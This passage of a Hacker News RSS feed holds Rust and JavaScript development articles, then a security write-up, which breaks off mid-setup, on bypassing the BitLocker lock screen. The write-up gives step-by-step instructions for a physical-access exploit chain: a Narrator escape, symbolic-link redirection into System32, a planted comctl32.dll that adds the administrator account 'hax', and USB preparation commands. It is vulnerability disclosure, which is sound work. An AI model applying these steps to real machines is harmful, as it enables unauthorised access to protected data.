been adapted to Rust, not only by calling the closest “rust counterpart
function”, but by trying to solve things “the rust way”. Similarily, all
explanations have been checked and revised, and in many cases heavily rewritten,
in the context of Rust. Therefore, this tutorial should be seen as a “rust
remix” of the original <code>C</code> version.</p>

<h2 id="feedback">Feedback</h2>
<p>I’m happy that you read my work and would love to <a href="https://www.philippflenker.com/about">hear from you</a> - especially if you are either stuck or have found a
better way to solve specific things. Keep in mind that this is mostly an
exercise for me to get to know Rust - so if there’s a better way to do things,
<a href="https://www.philippflenker.com/about">please reach out</a>!</p>

<h2 id="table-of-contents">Table of Contents</h2>
<ol>
  <li><a href="https://www.philippflenker.com/hecto-chapter-1/">Setup</a></li>
  <li><a href="https://www.philippflenker.com/hecto-chapter-2/">Reading User Input</a></li>
  <li><a href="https://www.philippflenker.com/hecto-chapter-3/">Raw User Input and Output</a></li>
  <li><a href="https://www.philippflenker.com/hecto-chapter-4/">A Text Viewer</a></li>
  <li><a href="https://www.philippflenker.com/hecto-chapter-5/">A Text Editor</a></li>
  <li><a href="https://www.philippflenker.com/hecto-chapter-6/">Search</a></li>
  <li><a href="https://www.philippflenker.com/hecto-chapter-7/">Syntax Highlighting</a></li>
</ol>

<ul>
  <li><a href="https://www.philippflenker.com/hecto-appendices/">Appendices</a></li>
</ul>

  </div></div>]]>
            </description>
            <link>https://www.philippflenker.com/hecto/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25809288</guid>
            <pubDate>Sun, 17 Jan 2021 09:00:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Testing Hardware Using Rust]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25809208">thread link</a>) | @lukastyrychtr
<br/>
January 17, 2021 | https://www.jaredwolff.com/testing-hardware-using-rust/ | <a href="https://web.archive.org/web/*/https://www.jaredwolff.com/testing-hardware-using-rust/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img alt="nRF9160 Feather Test CLI" src="https://www.jaredwolff.com/testing-hardware-using-rust/images/Screen_Shot_2021-01-06_at_10.30.55_AM.png" data-src="images/Screen_Shot_2021-01-06_at_10.30.55_AM.png"></p><p>Rust has grown on me over the past year. I consumed <a href="https://doc.rust-lang.org/stable/book/" target="_blank">The Book</a> while on a plane ride in February of last year <em>right</em> before Covid hit. It has basically been all downhill since. 😅</p><p>Since then, i’ve designed a (very alpha) <a href="https://github.com/jaredwolff/eagle-plm" target="_blank">CLI based MRP system</a>, e-commerce backend for <a href="https://www.jaredwolff.com/store/" target="_blank">my static website</a>, CLI based tester and firmware for my nRF9160 Feather test fixture. Yea, all in Rust.</p><p>In this article, i’ll be sharing details about how I developed the CLI and ATSAMD based tester for the <a href="https://www.jaredwolff.com/store/nrf9160-feather/" target="_blank">nRF9160 Feather</a>. By the end this should give you confidence that you can also develop your own firmware and software 100% in Rust!</p><p>Let’s get started.</p><h2 id="sprinkle-some-rust-in-your-firmware">Sprinkle some Rust in your firmware</h2><p><img alt="nRF9160 Feather tester hardware render" src="https://www.jaredwolff.com/testing-hardware-using-rust/images/feather-tester_v14.png" data-src="images/feather-tester_v14.png"></p><p>As mentioned earlier, I designed my tester hardware (pictured above) to use an ATSAMD microcontroller. I had a few reasons why I chose the ATSAMD21:</p><ol><li>It has a <strong>ton</strong> of pins. (ATSAMD21J18A-MFT has 52 to be exact!) This was going to be important in order to connect to and control everything about the DUT (Device under test) in the tester.</li><li>SAMD21 series is also ubiquitous and plentiful elsewhere. It also happens to have great support in the form of the <code>atsamd-hal</code> crate. (<a href="https://github.com/atsamd-rs/atsamd" target="_blank">Link</a>)</li></ol><p>While there is some test firmware on the DUT itself, there’s a bunch of exciting stuff happening on the tester side. But before we do, let’s chat about the bootloader.</p><h3 id="first-thing-you-should-do">First thing you should do</h3><p>After lots of tinkering I realized that one of the first things you should do on any SAMD based project is get the UF2 bootloader loaded. Since loading it onto my test board <strong>I haven’t used my debug probe.</strong> (Rust makes this extremely easy since it eliminates 80% of the stupid mistakes i’d otherwise make in C)</p><p>Here’s a quick primer on how I got my board working:</p><ol><li><p>I cloned the UF2 repo:</p><div><pre><code data-lang="bash">git clone https://github.com/microsoft/uf2-samdx1
</code></pre></div></li><li><p>Created a folder called <code>circuitdojo_feather_tester</code> within the <code>boards</code> directory.</p><div><pre><code data-lang="bash">cd uf2-samdx1
mkdir boards/circuitdojo_feather_tester
</code></pre></div></li><li><p>I created <code>board.mk</code> and <code>board_config.h</code></p><div><pre><code data-lang="bash">cd boards/circuitdojo_feather_tester
touch board.mk
touch board_config.h
</code></pre></div></li><li><p>Using the already existing boards in the <code>boards</code> folder, updated the contents of <code>http://board.mk</code> and <code>board_config.h</code>. First <code>board.mk</code> to define what chip I was targeting:</p><div><pre><code data-lang="c">CHIP_FAMILY <span>=</span> samd21
CHIP_VARIANT <span>=</span> SAMD21J18A
</code></pre></div><p>Then <code>board_config.h</code> for all the configuration bits:</p><div><pre><code data-lang="c"><span>#ifndef BOARD_CONFIG_H
</span><span>#define BOARD_CONFIG_H
</span><span></span>
<span>#define VENDOR_NAME "Circuit Dojo"
</span><span>#define PRODUCT_NAME "Feather Tester"
</span><span>#define VOLUME_LABEL "BOOT"
</span><span>#define INDEX_URL "https:</span><span>//www.jaredwolff.com/"
</span><span></span><span>#define BOARD_ID "SAMD21G18A-Feather-v0"
</span><span></span>
<span>#define USB_VID 0x16c0
</span><span>#define USB_PID 0x27dd
</span><span></span>
<span>#define LED_PIN PIN_PA22
</span><span></span>
<span>#endi
</span></code></pre></div></li><li><p>Then using the instructions in the Readme, build the code:</p><div><pre><code data-lang="bash">make BOARD<span>=</span>circuitdojo_feather_tester
</code></pre></div><p>I used the toolchain that comes with NCS v1.4.1. I did have to make a change to the Makefile for everything to compile without borking. Turns out my toolchain was newer than expected. Fortunately adding <code>Wno-deprecated</code> inside the Makefile to the <code>WFLAGS</code> variable fixes this problem.</p></li><li><p>Once complete it will dump your binary/hex files to <code>build/&lt;your board name&gt;</code></p></li><li><p>Then I flashed the bootloader using <code>pyocd</code> like so:</p><div><pre><code data-lang="bash">pyocd flash -t ATSAMD21J18A -f <span>4000000</span> bootloader-circuitdojo_feather_tester-v3.4.0-65-gdf89a1f-dirty.elf --format elf
</code></pre></div><p><code>pyocd</code> is just one of many ways to load firmware. The <a href="https://github.com/atsamd-rs/atsamd" target="_blank"><code>atsamd-rs</code> repo</a> has a ton more options.</p></li></ol><p>Once programmed, hit the reset button twice in quick succession to enable bootloader mode. (I believe this is consistent across all other boards using the UF2 bootloader. Correct me if i’m wrong!) This will cause the bootloader to remain active so you can transfer new firmware.</p><p>On a scale from easy to painful, this was defintiely on the easy side of the spectrum. The folks at Microsoft and contributors like Adafruit made this process <em>really simple.</em></p><h3 id="hey-my-name-is-hal">Hey, my name is HAL</h3><p><img alt="Compiling Rust firmware" src="https://www.jaredwolff.com/testing-hardware-using-rust/images/Screen_Shot_2021-01-10_at_12.37.34_PM.png" data-src="images/Screen_Shot_2021-01-10_at_12.37.34_PM.png"></p><p>As of this writing, every different hardware platform has some type of independently created HAL (hardware abstraction layer). Atmel’s SAMD differs slightly from nRF and that differs from the STM32s of the world. The nice thing is as long as they conform to the higher level APIs, you can use something like the <a href="https://github.com/mvirkkunen/usb-device" target="_blank">USB crate</a> which supports ATSAMD and STM32.</p><p>The fastest way to get started with your own ATSAMD based board to create your own board definition. You can find a <strong>ton</strong> of example in the <code>boards</code> directory. Many off the shelf boards are already supported which makes for one less thing you need to do!</p><p>If you do find yourself with a custom board, you can copy one of the already existing boards that is closest to yours. For instance I used <code>feather_m0</code> as the base for my tester board. I tweaked <code>memory.x</code> and <code>src/lib.rs</code> to my liking.</p><p>There’s even a cool way to define pins so you can easily access them later. For for instance if you have a pin named <code>FLASH_EN</code> and it’s mapped to pin port B, pin 8 you can simply reference it later on using the <code>Pins</code> struct like <code>pins.flash_en</code>. (More below..)</p><p>The ATSAMD repo is going through some slow and steady improvements. There are even some nice additions to the <a href="https://github.com/atsamd-rs/atsamd/pull/371" target="_blank">board support</a> area that i’m excited about and testing. While it’s mostly useable, it is rough in some areas (especially related to documentation).</p><p><em>Big shoutout to Bradley who has been spearheading these improvements. If I were to do any of this, i’d be surprised it would be working by then of it.</em> 😅</p><h3 id="dont-be-unsafe">Don’t be <code>unsafe</code></h3><p>When I first started developing the test firmware, I notice that I was using <code>unsafe</code> a lot. While in hardwareland using <code>unsafe</code> is not uncommon, from a readability and risk for increased errors perspective, it can get hairy.</p><p>There is a cool solution around this and that’s where <code>rtic</code> enters the picture. <code>rtic</code> is a new spin on how to write firmware in Rust. Instead of having the familiar <code>main</code> function, it works differently. Here’s the features from <a href="https://github.com/rtic-rs/cortex-m-rtic" target="_blank">the Github page</a>:</p><ul><li><strong>Tasks</strong>&nbsp;as the unit of concurrency [^1]. Tasks can be&nbsp;<em>event triggered</em>&nbsp;(fired in response to asynchronous stimuli) or spawned by the application on demand.</li><li><strong>Message passing</strong>&nbsp;between tasks. Specifically, messages can be passed to software tasks at spawn time.</li><li><strong>A timer queue</strong>&nbsp;[^2]. Software tasks can be scheduled to run at some time in the future. This feature can be used to implement periodic tasks.</li><li>Support for prioritization of tasks and, thus,&nbsp;<strong>preemptive multitasking</strong>.</li><li><strong>Efficient and data race free memory sharing</strong>&nbsp;through fine grained&nbsp;<em>priority based</em>&nbsp;critical sections [^1].</li><li><strong>Deadlock free execution</strong>&nbsp;guaranteed at compile time. This is an stronger guarantee than what’s provided by&nbsp;<a href="https://doc.rust-lang.org/std/sync/struct.Mutex.html" target="_blank">the standard&nbsp;<code>Mutex</code>abstraction</a>.</li><li><strong>Minimal scheduling overhead</strong>. The task scheduler has minimal software footprint; the hardware does the bulk of the scheduling.</li><li><strong>Highly efficient memory usage</strong>: All the tasks share a single call stack and there’s no hard dependency on a dynamic memory allocator.</li><li><strong>All Cortex-M devices are fully supported</strong>.</li><li>This task model is amenable to known WCET (Worst Case Execution Time) analysis and scheduling analysis techniques. (Though we haven’t yet developed Rust friendly tooling for that.)</li></ul><p>While all these features and capabilities seem great, so what gives?</p><p>Well, for starters there’s no <code>main</code> function. 🙀</p><p>Here’s what a basic blinky app looks like using some of the new BSP (Board support packages) I mentioned earlier:</p><div><pre><code data-lang="rust"><span>#![deny(unsafe_code)]</span>
<span>#![no_main]</span>
<span>#![no_std]</span>

<span>extern</span> <span>crate</span> circuitdojo_tester <span>as</span> hal;
<span>use</span> panic_halt <span>as</span> _;

<span>use</span> hal::clock::GenericClockController;

<span>use</span> hal::delay::Delay;
<span>use</span> hal::prelude::<span>*</span>;
<span>use</span> hal::Pins;

<span>#[rtic::app(device = hal::pac, peripherals = true)]</span>
<span>const</span> APP: () <span>=</span> {
    <span>struct</span> <span>Resources</span> {
        led_pass: <span>hal</span>::LedPass,
        delay: <span>Delay</span>,
    }
    <span>#[init()]</span>
    <span>fn</span> <span>init</span>(cx: <span>init</span>::Context) -&gt; <span>init</span>::LateResources {
        <span>let</span> <span>mut</span> peripherals <span>=</span> cx.device;
        <span>let</span> <span>mut</span> clocks <span>=</span> GenericClockController::with_external_32kosc(
            peripherals.GCLK,
            <span>&amp;</span><span>mut</span> peripherals.PM,
            <span>&amp;</span><span>mut</span> peripherals.SYSCTRL,
            <span>&amp;</span><span>mut</span> peripherals.NVMCTRL,
        );
        <span>let</span> pins <span>=</span> Pins::new(peripherals.PORT);
        <span>let</span> led_pass <span>=</span> pins.led_pass.into_push_pull_output();

        <span>let</span> delay <span>=</span> Delay::new(cx.core.SYST, <span>&amp;</span><span>mut</span> clocks);

        init::LateResources { led_pass, delay }
    }
    <span>#[idle(resources=[led_pass, delay]</span>)]
    <span>fn</span> <span>idle</span>(cx: <span>idle</span>::Context) -&gt; <span>!</span> {
        <span>loop</span> {
            <span>let</span> _ <span>=</span> cx.resources.led_pass.toggle();
            cx.resources.delay.delay_ms(<span>500</span><span>u32</span>);
        }
    }
};
</code></pre></div><p>The <code>init</code> function is where you would normally put anything you’d normally put in an Arduino <code>setup</code> function. We’re setting up pins and peripherals. If you want to use them later on though, you’ll need to create an entry in <code>Resources</code>. This is also where you store any type of static mutable data structures that you need elsewhere in your firmware.</p><p>The <code>idle</code> function is similar to the <code>loop</code> function in Arduino. It’s important though that if you want a loop, you have to implement it. Here’s the warning in the <a href="https://rtic.rs/0.5/book/en/by-example/app.html?highlight=loop#idle" target="_blank"><code>rtic</code> documentation</a>:</p><blockquote><p>Unlike init, idle will run with interrupts enabled and it’s not allowed to return so it must run forever.</p></blockquote><p>You don’t <strong>need</strong> to use an <code>idle</code> function though. If you don’t, your microcontroller will go to sleep. This is ideal for battery powered applications that need to sleep as much as possible.</p><p>In <code>rtic</code> every work function gets a <code>Context</code> variable. It allow you to access resources that are pertinent to that function’s purpose. Access is only granted though when you add a resource like below:</p><div><pre><code data-lang="rust"><span>#[idle(resources=[led_pass, delay]</span>)]
</code></pre></div><p>If <code>resources</code> was not set like above, I would not be able to use <code>led_pass</code> or <code>delay</code> within the function!</p><p>While this is a simple example, when you start using static resources like fixed size vectors you’ll be happy you chose to use <code>rtic</code>. The <a href="https://github.com/japaric/heapless" target="_blank"><code>heapless</code></a> crate has been extremely useful for setting size contrained elements that you’d normally be able to use with Rust’s <code>std</code> lib.</p><p>While <code>heapless</code> implements a few very handy types, the <code>Vec</code> and <code>spsc</code> imlementation have been <em>extremely</em> useful. If you’re looking for <code>std</code> conventions for embedded, no need to look further. Get started with <code>heapless</code> with their great documentation <a href="https://japaric.github.io/heapless/heapless/index.html" target="_blank">here</a>.</p><h3 id="the-confusion-ensues">The confusion ensues</h3><p>One thing that may be confusing …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.jaredwolff.com/testing-hardware-using-rust/">https://www.jaredwolff.com/testing-hardware-using-rust/</a></em></p>]]>
            </description>
            <link>https://www.jaredwolff.com/testing-hardware-using-rust/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25809208</guid>
            <pubDate>Sun, 17 Jan 2021 08:43:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How I build JavaScript apps in 2021]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25809132">thread link</a>) | @timdaub
<br/>
January 17, 2021 | https://timdaub.github.io/2021/01/16/web-principles/ | <a href="https://web.archive.org/web/*/https://timdaub.github.io/2021/01/16/web-principles/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>It's now roughly seven or eight years that I'm building dynamic front ends for the web. From <a target="_blank" rel="noopener" href="https://www.ascribe.io/">digital art wallets</a> to games (<a target="_blank" rel="noopener" href="https://ipfs.leapdao.org/blog/Planet-A-ccc-ethberlin-recap/">1</a>, <a href="https://timdaub.github.io/videogame">2</a>) and <a href="https://timdaub.github.io/wasm-synth">synthesizers</a>, I've seen it all. And since my process of creation has dramatically changed over the years, today, I'd like to share how I'm developing web apps in 2021.</p>
<h2 id="i-avoid-build-processes.">I avoid build processes.</h2>
<p>I still remember the debates with colleagues about using <a target="_blank" rel="noopener" href="https://babeljs.io/">babel</a> a few years ago. Within the front end development world, transpiling had just become a thing, so we ended up babelifying our builds to use ES6. Our argument back then was that one day, we would be able to push our application's directory structure on a web server and since all browsers would then support the augmented ES6 features, our app would just work! Without a build process. WOW! That must have been around 2015. When I look at the source code of these old applications now, our technical visions didn't end up becoming reality.</p>
<p>Now, I try to keep my build process to a minimum. When I need to write a demo app, I particularly like using <a target="_blank" rel="noopener" href="https://babeljs.io/docs/en/babel-standalone#script-tags"><code>&lt;script type="text/babel"&gt;</code></a>. I love <a target="_blank" rel="noopener" href="https://preactjs.com/guide/v10/getting-started/#no-build-tools-route">preact's "no build tools route."</a> too. When I have to set up an actual app, I avoid <a target="_blank" rel="noopener" href="https://webpack.js.org/">webpack</a> and <a target="_blank" rel="noopener" href="https://rollupjs.org/">rollup</a>. I mainly get frustrated about the myriad ways of configuring them. Some minor thing always ends up being broken, which leads to hours of debugging foreign code. And that's frustrating. Using preact's no build route, finally something like the above is possible:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></pre></td><td><pre><span>&lt;script type=<span>"module"</span>&gt;</span><br><span>  </span><br><span>  <span>import</span> { h, Component, render } <span>from</span> <span>'https://unpkg.com/preact?module'</span>;</span><br><span>  <span>const</span> app = h(<span>'h1'</span>, <span>null</span>, <span>'Hello World!'</span>);</span><br><span>  render(app, <span>document</span>.body);</span><br><span>&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>When having to use a build tool, I gravitate towards <a target="_blank" rel="noopener" href="https://parceljs.org/">parcel</a> or <a target="_blank" rel="noopener" href="https://github.com/developit/microbundle">microbundle</a> as they come preconfigured. And in particular, parcel is excellent, as it's merely using an HTML file as its entry point. To me, that's promising as it assumes a proper directory structure and properly connected files such that maybe one day I can push my app to the web without that build step.</p>
<h2 id="i-avoid-transpiling.">I avoid transpiling.</h2>
<p>For the same reasons as pointed out above, I also try to avoid transpiling. It's not because I don't like ESNext features, but more because I want to minimize the risk of getting stuck with the transpiler. Hence, I try to avoid using babel. <a href="https://timdaub.github.io/2020/09/01/typescript/">I also don't use Typescript</a>. To me, JavaScript is productive enough. Additionally, for <a target="_blank" rel="noopener" href="https://reactjs.org/">react</a>-style projects, no transpilers mean I stopped using <a target="_blank" rel="noopener" href="https://reactjs.org/docs/introducing-jsx.html">JSX</a>. Instead, I found an excellent library called <a target="_blank" rel="noopener" href="https://github.com/developit/htm">htm</a> that uses JavaScript's template strings. It has a similar syntax to JSX, but it's not breaking ECMAScript standards and hence needs no transpliation.</p>
<h2 id="i-avoid-the-new-and-shiny.">I avoid the <em>new</em> and <em>shiny</em>.</h2>
<p>I even avoid changing the way I work if I don't feel comfortable or inclined. For example, I never switched to <a target="_blank" rel="noopener" href="https://reactjs.org/docs/hooks-intro.html">react hooks</a>. The <a target="_blank" rel="noopener" href="https://reactjs.org/docs/state-and-lifecycle.html">lifecycle methods</a> that I initially know from iOS Objective-C programming are - in my opinion - a beautiful metaphor for writing front end components. And neither did I have any issues with my sites' performance. I would make the switch if I started to have problems. But I don't. The same goes for up and coming frameworks. Angular V2? <a target="_blank" rel="noopener" href="https://svelte.dev/">Svelte</a>? Cool, but why relearn a framework when I'm already productive with the one I use?</p>
<h2 id="i-test-everything.">I test EvErYtHiNg.</h2>
<p>When I started front-end development, testing was complicated. Only a few front end developer colleagues tested their apps properly. I ended up doing a lot of testing by hand. It was frustrating and unproductive. But testing front ends has improved dramatically over the years. Not only have the tools been significantly enhanced.</p>
<p>We, as front-end developers, have now also figured out how to correctly write front end tests. Finally, we're able to distinguish between functional code and presentational code. For functional code, we now write unit tests. For presentational code, we use snapshot-based testing and integration tests. I'm pleased about tools like <a target="_blank" rel="noopener" href="https://www.cypress.io/">cypress</a> that is great for integration tests. I also like <a target="_blank" rel="noopener" href="https://github.com/avajs/ava/">ava</a> for unit tests.</p>
<h2 id="i-optimize-for-performance-and-quality.">I optimize for performance and quality.</h2>
<p>I used to be eager about building extensively functional software: the more features, the better. I'm not anymore. Instead, I try to develop software that works well for my users. I strive for quality. So I try to measure my build's size. I take proper care about delivering my application, meaning I turn on compression and <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Caching">caching</a>. I care about optimizing my static assets like pictures. And I like to check my apps by using tools like <a target="_blank" rel="noopener" href="https://developers.google.com/speed/pagespeed/insights/?hl=de">PageSpeed Insights</a> or <a target="_blank" rel="noopener" href="https://developers.google.com/web/tools/lighthouse">lighthouse</a>.</p>
<h2 id="i-use-my-own-work">I use my own work</h2>
<p>From experience, I learned that I hardly ever get stuck on a algorithmic problem. On the contrary, I get motivated to learn something new and excel in the process. However, I caught my self often spending many hours on debugging other people's code. Mainly when it's third-party libraries that I included via npm. Once, I thought that using npm packages was a JavaScript developer's superpower. Now, I know that it can also be their curse.</p>
<p>Instead of collecting heaps of third-party code, I now prefer following <a target="_blank" rel="noopener" href="http://hintjens.com/blog:96">Peter Hintjens' principles for writing good code</a>. I "use my own work." Meaning, I dare to write seemingly complex code myself. I still won't roll my own crypto or write a date library, but I dare to implement parts of a protocol or build an algorithm. It's not to say that I ditch every npm package and go npm-keto-diet. No, instead, I take a more mindful approach towards dependencies and only include them when I truly need them.</p>
<p>I try to do that by leaving my technical vision at the doorstep of my office, so that I can now focus on solving the problems at hand. I try to stop worrying about eventualities far in the future as I view that as speculation. In cases I have past experiences, I use it to form my decision. For unchartered teritory, I move carefully, step by step.</p>
<h2 id="i-use-open-source-to-my-advantage.">I use open source to my advantage.</h2>
<p>I'm building websites since I'm a teenager. And had I open-sourced and maintained a few pieces of code that I need frequently, I'd be more productive now. Unfortunately, I was short-sighted. Surprisingly, I didn't think about still using JavaScript at 29 years of age 😂</p>
<p>I stopped framing open source mainly around certain virtues like free speech, fairness or certain politics. They're still important virtues for me, but I learned that I could use open source also for building a personal toolset.</p>
<p>Extracting a library from a codebase allows me to think about it from a user's perspective. It means I'm able to think about a piece of code's interfaces emphatically. Additionally, there's positive peer pressure. I'm not going to release shit to the world. When my project is public, it's going to have a proper README and some docs. And it's going to be tested. Since everybody can see it, I might as well create something I can be proud of.</p>
<p>Hence, contributing to open source, for me, is about building high-quality software. Being anxious about not being able to monetize this particular piece of code has become less of a concern. <a target="_blank" rel="noopener" href="https://github.com/sindresorhus">sindresohrus</a> inspired me to treat open source packages like my personal toolbox.</p>
<h2 id="conclusion">Conclusion</h2>
<p>And that's my incomplete list of principles. I'm sure there's more than just these. Anyway, I still find some of these points quite controversial. I'm sure they won't work for everyone as all our contexts differ. But working solo as a freelancer, I've found that these principles contribute to me being content about what I'm doing. Hence, I was eager to share them.</p>
<p>I'm curious to hear other's thoughts and see if they've taken similar paths. Please reach out! Also, don't forget to subscribe to my newsletter!</p>

  </div></div>]]>
            </description>
            <link>https://timdaub.github.io/2021/01/16/web-principles/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25809132</guid>
            <pubDate>Sun, 17 Jan 2021 08:23:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Dubai Lamp: The “World’s Most Efficient” LED Light Bulb]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25808959">thread link</a>) | @lisper
<br/>
January 16, 2021 | https://kbelectricpa.com/dubai-lamp-worlds-efficient-led-light-bulb/ | <a href="https://web.archive.org/web/*/https://kbelectricpa.com/dubai-lamp-worlds-efficient-led-light-bulb/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://kbelectricpa.com/dubai-lamp-worlds-efficient-led-light-bulb/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25808959</guid>
            <pubDate>Sun, 17 Jan 2021 07:34:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Interesting Tautologies]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25808762">thread link</a>) | @JNRowe
<br/>
January 16, 2021 | https://www.mscroggs.co.uk/blog/83 | <a href="https://web.archive.org/web/*/https://www.mscroggs.co.uk/blog/83">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.mscroggs.co.uk/blog/83</link>
            <guid isPermaLink="false">hacker-news-small-sites-25808762</guid>
            <pubDate>Sun, 17 Jan 2021 06:56:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[BitLocker Lockscreen Bypass]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25808059">thread link</a>) | @notRobot
<br/>
January 16, 2021 | https://secret.club/2021/01/15/bitlocker-bypass.html | <a href="https://web.archive.org/web/*/https://secret.club/2021/01/15/bitlocker-bypass.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>BitLocker is a modern data protection feature that is deeply integrated in the Windows kernel. It is used by many corporations as a means of protecting company secrets in case of theft. Microsoft recommends that you have a Trusted Platform Module which can do some of the heavy cryptographic lifting for you.</p><p>Given a Windows 10 system without known passwords and a BitLocker-protected hard drive, an administrator account could be adding by doing the following:</p><ul><li>At the sign-in screen, select “I have forgotten my password.”</li><li>Bypass the lock and enable autoplay of removable drives.</li><li>Insert a USB stick with my .exe and a junction folder.</li><li>Run executable.</li><li>Remove the thumb drive and put it back in again, go to the main screen.</li><li>From there launch narrator, that will execute a DLL payload planted earlier.</li></ul><p>Now a user account is added called hax with password “hax” with membership in Administrators. To update the list with accounts to log into, click <em>I forgot my password</em> and then return to the main screen.</p><h2 id="bypassing-the-lock-screen"> <a href="#bypassing-the-lock-screen">Bypassing the lock screen</a></h2><p>First, we select the “I have forgotten my password/PIN” option. This option launches an additional session, with an account that gets created/deleted as needed; the user profile service calls it a default-account. It will have the first available name of defaultuser1, defaultuser100000, defaultuser100001, etc.</p><p>To escape the lock, we have to use the Narrator because if we manage to launch something, we cannot see it, but using the Narrator, we will be able to navigate it. However, how do we launch something?</p><p><img src="https://secret.club/assets/bitlockerbypass/1.png" alt=""></p><p>If we smash shift 5 times in quick succession, a link to open the Settings app appears, and the link actually works. We cannot see the launched Settings app. Giving the launched app focus is slightly tricky; you have to click the link and then click a place where the launched app would be visible with the correct timing. The easiest way to learn to do it is, keep clicking the link roughly 2 times a second. The sticky keys windows will disappear. Keep clicking! You will now see a focus box is drawn in the middle of the screen. That was the Settings app, and you have to stop clicking when it gets focus.</p><p>Now we can navigate the Settings app using CapsLock + Left Arrow, press that until we reach Home. Now, when Home has focus, hold down Caps Lock and press Enter. Using CapsLock + Right Arrow navigate to Devices and CapsLock + Enter when it is in focus.</p><p><img src="https://secret.club/assets/bitlockerbypass/2.png" alt=""></p><p>Now navigate to AutoPlay, CapsLock + Enter and choose “Open Folder to view files (File Explorer).” Now insert the prepared USB drive, wait some seconds, the Narrator will announce the drive has been opened, and the window is focused. Now select the file <strong>Exploit.exe</strong> and execute it with CapsLock + Enter. That is arbitrary code execution, ladies and gentlemen, without using any passwords. However, we are limited by running as the default profile.</p><p>I have made a video with my phone, as I cannot take screenshots.</p><iframe width="560" height="315" src="https://www.youtube.com/embed/ZdsSgklRoag" frameborder="0" allowfullscreen=""></iframe><h2 id="elevation-of-privilege"> <a href="#elevation-of-privilege">Elevation of privilege</a></h2><p>When a USB stick is mounted, BitLocker will create a directory named ClientRecoveryPasswordRotation in System Volume Information and set permissions to:</p><div><div><pre><code>NT AUTHORITY\Authenticated Users:(F)
NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
</code></pre></div></div><p>To redirect the create operation, a symbolic link in the NT namespace is needed as that allows us to control the filename, and the existence of the link does not abort the operation as it is still creating the directory.</p><p>Therefore, take a USB drive and make <code>\System Volume Information</code> a mount point targeting <code>\RPC Control</code>. Then make a symbolic link in <code>\RPC Control\ClientRecoveryPasswordRotation</code> targetting <code>\??\C:\windows\system32\Narrator.exe.local</code>. If the USB stick is reinserted then the folder <code>C:\windows\system32\Narrator.exe.local</code> will be created with permissions that allows us to create a subdirectory:</p><div><div><pre><code>amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.657_none_e6c5b579130e3898
</code></pre></div></div><p>Inside this subdirectory, we drop a payload DLL named <em>comctl32.dll</em>. Next time the Narrator is triggered, it will load the DLL. By the way, I chose the Narrator as that is triggerable from the login screen as a system service and is not auto-loaded, so if anything goes wrong, we can still boot.</p><h2 id="combining-them"> <a href="#combining-them">Combining them</a></h2><p>The <code>ClientRecoveryPasswordRotation</code> exploit to work requires a symbolic link in <code>\RPC Control</code>. The executable on the USB drive creates the link using two calls to <code>DefineDosDevice</code>, making the link permanent so they can survive a logout/in if needed.</p><p>Then a loop is started in which the executable will:</p><ul><li>Try to create the subdirectory.</li><li>Plant the payload <code>comctl32.dll</code> inside it.</li></ul><p>It is easy to see when the loop is running because the Narrator will move its focus box and say “access denied” every second. We can now use the link created in <code>RPC Control</code>. Unplug the USB stick and reinsert it. The writeable directory will be created in <code>System32</code>; on the next loop iteration, the payload will get planted, and exploit.exe will exit. To test if the exploit has been successful, close the Narrator and try to start it again.</p><p>If the narrator does not work, it is because the DLL is planted, and Narrator executes it, but it fails to add an account because it is launched as <code>defaultuser1</code>. When the payload is planted, you will need to click back to the login screen and start Narrator; 3 beeps should play, and a message box saying the DLL has been loaded as <code>SYSTEM</code> should show. Great! The account has been created, but it is not in the list. Press “I forgot my password” and click back to update the list.</p><p>A new account named hax should appear, with password hax.</p><p>I used these steps to arm the USB device</p><div><div><pre><code>C:\Users\jonas&gt;format D: /fs:ntfs /q
Insert new disk for drive D:
Press ENTER when ready...
-----
File System: NTFS.
Quick Formatting 30.0 GB
Volume label (32 characters, ENTER for none)?
Creating file system structures.
Format complete.
30.0 GB total disk space.
30.0 GB are available.
</code></pre></div></div><p>Now, we need to elevate to admin to delete <code>System Volume Information</code>.</p><div><div><pre><code>C:\Users\jonas&gt;d:
D:\&gt;takeown /F "System Volume Information"
</code></pre></div></div><p>This results in</p><div><div><pre><code>SUCCESS: The file (or folder): "D:\System Volume Information" now owned by user "DESKTOP-LTJEFST\jonas".
</code></pre></div></div><p>We can then</p><div><div><pre><code>D:\&gt;icacls "System Volume Information" /grant Everyone:(F)
Processed file: System Volume Information
Successfully processed 1 files; Failed processing 0 files
D:\&gt;rmdir /s /q "System Volume Information"
